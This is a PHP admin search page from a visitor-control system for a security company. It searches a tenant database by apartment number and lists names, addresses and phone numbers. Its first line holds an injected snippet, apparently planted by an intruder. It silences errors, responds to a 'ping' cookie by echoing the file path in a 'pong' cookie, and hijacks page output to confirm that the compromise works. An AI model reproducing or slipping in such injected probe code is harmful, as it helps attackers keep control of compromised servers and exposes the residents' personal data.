<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/search.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/search.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/search.php<-";}return "NotGO->./cynergi/admin/search.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Restrict Access To Page: Grant or deny access to this page
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // For security, start by assuming the visitor is NOT authorized. 
  $isValid = False; 

  // When a visitor has logged into this site, the Session variable MM_Username set equal to their username. 
  // Therefore, we know that a user is NOT logged in if that Session variable is blank. 
  if (!empty($UserName)) { 
    // Besides being logged in, you may restrict access to only certain users based on an ID established when they login. 
    // Parse the strings into arrays. 
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Or, you may restrict access to only certain users based on their username. 
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "index.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($QUERY_STRING) && strlen($QUERY_STRING) > 0) 
  $MM_referrer .= "?" . $QUERY_STRING;
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$colname_usuario = "-1";
if (isset($_SESSION['MM_Username'])) {
  $colname_usuario = $_SESSION['MM_Username'];
}
mysql_select_db($database_dplace, $dplace);
$query_usuario = sprintf("SELECT * FROM tbl_admins WHERE username = %s", GetSQLValueString($colname_usuario, "text"));
$usuario = mysql_query($query_usuario, $dplace) or die(mysql_error());
$row_usuario = mysql_fetch_assoc($usuario);
$totalRows_usuario = mysql_num_rows($usuario);

function bk($strtobold, $keywords) { $patterns = Array(); $replaces = Array();
if ($keywords != "") {  
    $words=explode(" ", $keywords);
    foreach($words as $word){
        $patterns[]='/'.$word.'/i';
        $replaces[]='<b>$0</b>';
    }
    return preg_replace($patterns, $replaces, $strtobold); 
} else return $strtobold;
}

$colname_tennants = "-1";
if (isset($_POST['names'])) {
  $colname_tennants = $_POST['names'];
}
mysql_select_db($database_dplace, $dplace);
$query_tennants = sprintf("SELECT * FROM tbl_tennants WHERE `apt` LIKE %s ORDER BY `names` ASC", GetSQLValueString("%" . $colname_tennants . "%", "text"));
//echo $query_tennants;
$tennants = mysql_query($query_tennants, $dplace) or die(mysql_error());
$row_tennants = mysql_fetch_assoc($tennants);
$totalRows_tennants = mysql_num_rows($tennants);
?>
<?php 
// Credits: http://www.bitrepository.com/ 
function hightlight($str, $keywords = '') 
{ 
$keywords = preg_replace('/\s\s+/', ' ', strip_tags(trim($keywords))); // filter 
 
$style = 'highlight'; 
$style_i = 'highlight_important'; 
 
/* Apply Style */
$var = ''; 
 
foreach(explode(' ', $keywords) as $keyword) 
{ 
$replacement = "<span class='".$style."'>".$keyword."</span>"; 
$var .= $replacement." "; 
 
$str = str_ireplace($keyword, $replacement, $str); 
}  
/* Apply Important Style */

$str = str_ireplace(rtrim($var), "<span class='".$style_i."'>".$keywords."</span>", $str); 
return $str; 
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/templateadmin.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- InstanceBeginEditable name="doctitle" -->
<title>Dplace Admin Area</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
<link href="../css/style.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {
	background-image: url(../images/bgnd2.jpg);
	background-repeat: repeat-x;
}
-->
</style>
<script type="text/javascript" id="sothink_dhtmlmenu"> <!--
 st_siteroot="";
 st_jspath="stmenu.js";
 if(!window.location.href.indexOf("file:") && st_jspath.charAt(0)=="/")
  document.write('<script type="text/javascript" src="'+st_siteroot+st_jspath+'"><\/script>');
 else 
  document.write('<script type="text/javascript" src="'+st_jspath+'"><\/script>');
//--> </script></head>

<body>
<table width="627" height="132" border="0" align="center">
  <tr>
    <td width="232" height="128" align="center"><img src="../images/dplace_logo.JPG" alt="" width="175" height="87" /></td>
    <td width="385" align="center"><span class="titulo">Visitor control system <br />
      All American Security Services</span></td>
  </tr>
</table>
<table width="673" border="0" align="center">
  <tr>
    <td width="362" align="center"><span> &nbsp;
      <script type="text/javascript" src="adminis.js"></script>
    </span></td>
  </tr>
</table>
<!-- InstanceBeginEditable name="central" -->
<table width="816" height="367" border="0" align="center">
  <tr>
    <td align="center" valign="top"><form id="form1" name="form1" method="post" action="search_unit.php">
      <br />
      Please introduce the APT # like 205, 302.<br />
      <br />
      <table width="469" border="1">
        <tr>
          <td width="126" height="62" bgcolor="#333333" class="etiqueta">Unit to search:</td>
          <td width="240"><label>
            <input name="names" type="text" class="caja_search" id="names" size="20" />
          </label></td>
          <td width="81"><label>
            <input type="submit" name="button" id="button" value="Submit" />
          </label></td>
        </tr>
      </table>
    </form>
      <br />
      <table width="954" border="1">
        <?php if ($totalRows_tennants > 0) { // Show if recordset not empty ?>
        <tr bgcolor="#333333" class="etiqueta">
          <td width="381">Tennant</td>
          <td width="313">Address</td>
          <td width="116">Phone</td>
          <td width="116">Details</td>
        </tr>
        <?php do { ?>
        <tr>
          <td height="35" align="left" valign="middle" class="linea"><?php
			  $keywords = $_POST['names'];
			  $str = $row_tennants['names']; 
			  $string = hightlight($str, $keywords);
			  echo $string;?></td>
          <td align="left" class="linea"><?php echo $row_tennants['bldg']; ?> <?php echo $row_tennants['address']; ?> Apt# <?php echo $row_tennants['apt']; ?></td>
          <td align="center"><?php echo $row_tennants['phones']; ?></td>
          <td align="center"><a href="details.php?id=<?php echo $row_tennants['id_tennant']; ?>"><img src="../images/details.png" alt="" width="40" height="40" border="0" /></a></td>
        </tr>
        <?php } while ($row_tennants = mysql_fetch_assoc($tennants)); ?>
        <?php } // Show if recordset not empty ?>
    </table></td>
  </tr>
</table>
<br />
<!-- InstanceEndEditable -->
<table width="200" border="0" align="right">
  <tr>
    <td>User: <?php echo $row_usuario['names']; ?></td>
  </tr>
</table>
</body>
<!-- InstanceEnd --></html>
<?php
mysql_free_result($usuario);

mysql_free_result($tennants);
?>
